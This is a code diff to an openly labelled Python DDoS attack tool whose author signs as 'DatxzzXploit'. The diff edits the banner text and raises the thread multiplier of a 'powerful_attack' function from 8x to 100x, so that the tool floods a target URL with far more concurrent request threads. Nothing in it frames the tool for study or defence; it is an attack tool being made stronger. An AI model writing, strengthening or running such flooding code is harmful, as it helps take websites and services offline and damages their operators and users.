@@ -20,7 +20,7 @@ def memekv1():
               Free Palestine
        """, 'red'))
     print("--------------------------------------------------")
-    print("        DDoS Attack Tool - Python Edition")
+    print(" - DDoS Attack Tool - ")
     print("--------------------------------------------------")
     print("Version: 1.1")
     print("Author: DatxzzXploit")
@@ -113,10 +113,10 @@ def thread_rps(url, threads, method="GET", user_agents=None):
         t.start()
         time.sleep(0.1)  # Delay to avoid overloading the server too quickly
 
-# Function for powerful attack (8x power increase)
+# Function for powerful attack (100x power increase)
 def powerful_attack(url, threads, method="GET", user_agents=None):
-    print("Starting powerful attack (8x power)...")
-    new_threads = threads * 8  # Increase threads by 8 times
+    print("Starting powerful attack (100x power)...")
+    new_threads = threads * 100  # Increase threads by 100 times
     thread_rps(url, new_threads, method, user_agents)
 
 # Function to simulate starting idle time (attacker waits for a while)
